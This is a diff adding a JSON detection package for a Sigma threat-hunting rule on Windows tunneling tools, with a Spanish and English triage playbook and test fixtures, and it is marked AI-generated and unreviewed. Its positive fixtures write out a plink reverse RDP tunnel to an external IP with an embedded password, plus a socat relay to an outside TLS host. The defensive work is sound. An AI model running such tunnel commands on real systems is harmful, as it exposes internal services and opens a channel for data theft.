@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "c75309a3-59f8-4a8d-9c2c-4c927ad50555",
+    "title": "Tunneling Tool Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "Daniil Yugoslavskiy, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1041",
+      "T1071.001",
+      "T1572"
+    ],
+    "folder": "rules-threat-hunting"
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó en un endpoint Windows un binario conocido de tunneling o retransmisión (httptunnel, plink, socat o stunnel). Es una regla de threat hunting: la alerta es una pista para investigar, no una confirmación de compromiso.",
+      "what_it_detects": "Eventos de creación de procesos cuyo Image termina en \\httptunnel.exe, \\plink.exe, \\socat.exe o \\stunnel.exe. La regla solo revisa el nombre del archivo, así que no detecta copias renombradas y no evalúa los argumentos.",
+      "why_it_matters": "Estas herramientas permiten encapsular tráfico en SSH, TLS o HTTP. Un atacante puede usarlas para exponer RDP u otros servicios internos, saltarse controles perimetrales o sacar datos por un canal cifrado (T1572 Protocol Tunneling, T1041 Exfiltration Over C2 Channel, T1071.001 Web Protocols).",
+      "triage_steps": [
+        "Revise CommandLine: busque reenvíos de puertos (-R, -L, -D en plink), destinos externos, puertos como 3389 o 445 y credenciales incrustadas (-pw).",
+        "Verifique la ruta de Image: las rutas de instalación habituales son menos sospechosas que %TEMP%, %APPDATA%, C:\\Users\\Public o los directorios de IIS.",
+        "Analice ParentImage y el árbol de procesos: si el padre es w3wp.exe, cmd.exe lanzado por un servicio web o un script, se considera de alta sospecha.",
+        "Revise User, el tipo de logon y si la cuenta pertenece a un administrador que usa estas herramientas de forma habitual.",
+        "Calcule el hash del binario y compárelo con versiones oficiales. Compruebe la firma y OriginalFileName.",
+        "Busque conexiones de red del proceso en el mismo host dentro de +/- 15 minutos: IP de destino, puerto y volumen de datos salientes.",
+        "Busque alertas previas para el mismo host o usuario, así como ejecuciones del mismo hash en otros endpoints."
+      ],
+      "false_positives": [
+        "Administradores que usan plink o stunnel para tareas de soporte, automatización SSH o acceso a equipos de red.",
+        "Software legítimo que incluye stunnel o socat para cifrar conexiones, como clientes de bases de datos o agentes de monitoreo.",
+        "Scripts programados de respaldo o transferencia que usan plink contra servidores internos conocidos."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del host o con el usuario si la ejecución estaba autorizada y documentada.",
+        "Si no está autorizada, aísle el endpoint de la red y bloquee la IP o el dominio de destino en el firewall o el proxy.",
+        "Termine el proceso y conserve el binario, la línea de comandos y la memoria del proceso para análisis forense.",
+        "Rote las credenciales que aparezcan en CommandLine o que se hayan usado en el host, y busque mecanismos de persistencia como tareas programadas o servicios.",
+        "Si se trata de uso legítimo, documéntelo y ajuste la regla por host, ruta o usuario."
+      ],
+      "severity_rationale": "La severidad media es adecuada porque estas herramientas tienen usos administrativos legítimos frecuentes, pero su presencia fuera de esos contextos suele indicar tunneling o exfiltración."
+    },
+    "en": {
+      "summary": "A known tunneling or relay binary (httptunnel, plink, socat or stunnel) ran on a Windows endpoint. This is a threat-hunting rule, so treat the alert as a lead to investigate, not as proof of compromise.",
+      "what_it_detects": "Process creation events where Image ends with \\httptunnel.exe, \\plink.exe, \\socat.exe or \\stunnel.exe. The rule matches only the file name, so it misses renamed copies and does not evaluate arguments.",
+      "why_it_matters": "These tools wrap traffic in SSH, TLS or HTTP. Attackers use them to expose RDP or other internal services, get around perimeter controls, or move data out over an encrypted channel (T1572 Protocol Tunneling, T1041 Exfiltration Over C2 Channel, T1071.001 Web Protocols).",
+      "triage_steps": [
+        "Review CommandLine for port forwarding (plink -R, -L, -D), external destinations, ports such as 3389 or 445, and embedded credentials (-pw).",
+        "Check the Image path. Standard install folders are less suspicious than %TEMP%, %APPDATA%, C:\\Users\\Public or IIS directories.",
+        "Examine ParentImage and the process tree. A parent of w3wp.exe, a script host, or cmd.exe spawned by a web service is highly suspicious.",
+        "Check the User, the logon type, and whether the account belongs to an admin who routinely uses these tools.",
+        "Hash the binary and compare it with official releases. Check the signature and OriginalFileName.",
+        "Look at the process's network connections on the same host within +/- 15 minutes: destination IP, port and outbound volume.",
+        "Search for earlier alerts on the same host or user, and for the same hash running on other endpoints."
+      ],
+      "false_positives": [
+        "Administrators using plink or stunnel for support work, SSH automation or access to network devices.",
+        "Legitimate software that bundles stunnel or socat to encrypt connections, such as database clients or monitoring agents.",
+        "Scheduled backup or transfer scripts that run plink against known internal servers."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or the user that the execution was authorized and documented.",
+        "If it was not authorized, isolate the endpoint and block the destination IP or domain at the firewall or proxy.",
+        "Kill the process. Keep the binary, the command line and the process memory for forensics.",
+        "Rotate any credentials that appear in CommandLine or were used on the host, and look for persistence such as scheduled tasks or services.",
+        "If the use is legitimate, document it and tune the rule by host, path or user."
+      ],
+      "severity_rationale": "Medium fits because these tools have common legitimate admin uses, but seeing them outside those contexts often points to tunneling or exfiltration."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "plink.exe launched from a user temp folder by w3wp.exe, setting up a reverse RDP tunnel to an external host",
+        "event": {
+          "EventID": 1,
+          "Computer": "WEB-IIS-03.andes.example.com",
+          "User": "IIS APPPOOL\\DefaultAppPool",
+          "Image": "C:\\Users\\Public\\plink.exe",
+          "OriginalFileName": "Plink",
+          "CommandLine": "C:\\Users\\Public\\plink.exe -ssh -R 4444:127.0.0.1:3389 -l tunnel -pw P4ssw0rd! -batch 203.0.113.45",
+          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+          "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"",
+          "CurrentDirectory": "C:\\Windows\\System32\\inetsrv\\"
+        }
+      },
+      {
+        "description": "socat.exe relaying a local port to an external TLS endpoint",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Local\\Temp\\SOCAT.EXE",
+          "CommandLine": "SOCAT.EXE TCP-LISTEN:8080,fork OPENSSL:198.51.100.20:443,verify=0",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin runs the PuTTY GUI client (putty.exe). It shares the PuTTY suite with plink, but the Image does not end with any of the listed names.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201.andes.example.com",
+          "User": "ANDES\\admin.mrojas",
+          "Image": "C:\\Program Files\\PuTTY\\putty.exe",
+          "CommandLine": "\"C:\\Program Files\\PuTTY\\putty.exe\" -ssh admin@switch-core-01.example.com",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      },
+      {
+        "description": "Notepad opens a stunnel configuration file. The tool name appears only in CommandLine, not as the Image suffix.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-07.andes.example.com",
+          "User": "ANDES\\admin.mrojas",
+          "Image": "C:\\Windows\\System32\\notepad.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\notepad.exe\" C:\\Program Files (x86)\\stunnel\\config\\stunnel.conf",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:24:07+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
